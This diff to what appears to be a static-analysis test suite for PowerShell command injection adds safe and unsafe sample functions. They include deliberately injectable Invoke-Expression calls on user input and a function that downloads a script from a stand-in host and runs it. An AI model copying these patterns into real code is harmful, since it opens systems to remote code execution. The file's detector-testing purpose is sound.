@@ -163,25 +163,25 @@ function Invoke-StartProcessInjection
 
 $input = Read-Host "enter input" # $ Source
 
-Invoke-InvokeExpressionInjection1 -UserInput $input  
-Invoke-InvokeExpressionInjection2 -UserInput $input  
-Invoke-InvokeExpressionInjection3 -UserInput $input  
-Invoke-InvokeExpressionInjection4 -UserInput $input  
-Invoke-InvokeExpressionInjection5 -UserInput $input  
-Invoke-InvokeExpressionInjection6 -UserInput $input  
-Invoke-InvokeExpressionInjection7 -UserInput $input  
-Invoke-InvokeExpressionInjection8 -UserInput $input  
-Invoke-InvokeExpressionInjectionFP -UserInput $input  
-Invoke-ExploitableCommandInjection1 -UserInput $input  
-Invoke-ExploitableCommandInjection2 -UserInput $input  
-Invoke-ExploitableCommandInjection3 -UserInput $input   
-Invoke-ScriptBlockInjection1 -UserInput $input  
-Invoke-ScriptBlockInjection2 -UserInput $input  
-Invoke-MethodInjection1 -UserInput $input  
-Invoke-MethodInjection2 -UserInput $input  
-Invoke-MethodInjection3 -UserInput $input  
-Invoke-PropertyInjection -UserInput $input  
-Invoke-ExpandStringInjection1 -UserInput $input  
+Invoke-InvokeExpressionInjection1 -UserInput $input
+Invoke-InvokeExpressionInjection2 -UserInput $input
+Invoke-InvokeExpressionInjection3 -UserInput $input
+Invoke-InvokeExpressionInjection4 -UserInput $input
+Invoke-InvokeExpressionInjection5 -UserInput $input
+Invoke-InvokeExpressionInjection6 -UserInput $input
+Invoke-InvokeExpressionInjection7 -UserInput $input
+Invoke-InvokeExpressionInjection8 -UserInput $input
+Invoke-InvokeExpressionInjectionFP -UserInput $input
+Invoke-ExploitableCommandInjection1 -UserInput $input
+Invoke-ExploitableCommandInjection2 -UserInput $input
+Invoke-ExploitableCommandInjection3 -UserInput $input
+Invoke-ScriptBlockInjection1 -UserInput $input
+Invoke-ScriptBlockInjection2 -UserInput $input
+Invoke-MethodInjection1 -UserInput $input
+Invoke-MethodInjection2 -UserInput $input
+Invoke-MethodInjection3 -UserInput $input
+Invoke-PropertyInjection -UserInput $input
+Invoke-ExpandStringInjection1 -UserInput $input
 Invoke-ExpandStringInjection2 -UserInput $input
 Invoke-InvokeExpressionInjectionCmdletBinding -userInput $input
 Invoke-StartProcessInjection -UserInput $input
@@ -243,11 +243,11 @@ function Invoke-InvokeExpressionInjectionSafe5
     Invoke-Expression "Get-Process -Name $UserInput"
 }
 
-Invoke-InvokeExpressionInjectionSafe1 -UserInput $input 
-Invoke-InvokeExpressionInjectionSafe2 -UserInput $input 
-Invoke-InvokeExpressionInjectionSafe3 -UserInput $input 
-Invoke-InvokeExpressionInjectionSafe4 -UserInput $input 
-Invoke-InvokeExpressionInjectionSafe5 -UserInput $input 
+Invoke-InvokeExpressionInjectionSafe1 -UserInput $input
+Invoke-InvokeExpressionInjectionSafe2 -UserInput $input
+Invoke-InvokeExpressionInjectionSafe3 -UserInput $input
+Invoke-InvokeExpressionInjectionSafe4 -UserInput $input
+Invoke-InvokeExpressionInjectionSafe5 -UserInput $input
 
 function false-positive-in-call-operator($d)
 {
@@ -268,3 +268,49 @@ function flow-through-env-var() {
     $y = $env:bar
     . "$y" # $ Alert # but we have flow through them
 }
+
+function Invoke-ScriptBlockTypedCallOperatorSafe
+{
+    [CmdletBinding()]
+    param([ScriptBlock] $ScriptBlock)
+    & $ScriptBlock # GOOD
+}
+
+function Invoke-ScriptBlockValidatedCallOperatorSafe
+{
+    [CmdletBinding()]
+    param(
+        [ValidateScript({ $_ -is [ScriptBlock] })]
+        $ScriptBlock
+    )
+    & $ScriptBlock # GOOD
+}
+
+function Invoke-StartProcessArgumentListSafe
+{
+    param($UserInput)
+    Start-Process -FilePath "trusted.exe" -ArgumentList $UserInput # GOOD
+}
+
+function Invoke-TrustedInternalPathSafe
+{
+    param($UserInput)
+    $tool = Join-Path $PSScriptRoot "tools\trusted.exe"
+    & $tool $UserInput # GOOD
+}
+
+function Invoke-NumericCommandFragmentSafe
+{
+    param([int] $UserInput)
+    Invoke-Expression "Get-Process -Id $UserInput" # GOOD
+}
+
+function Invoke-RemoteDownloadExpressionInjection
+{
+    $payload = Invoke-RestMethod "https://example.invalid/payload.ps1" # $ Source
+    Invoke-Expression $payload # $ Alert
+}
+
+Invoke-StartProcessArgumentListSafe -UserInput $input
+Invoke-TrustedInternalPathSafe -UserInput $input
+Invoke-NumericCommandFragmentSafe -UserInput $input
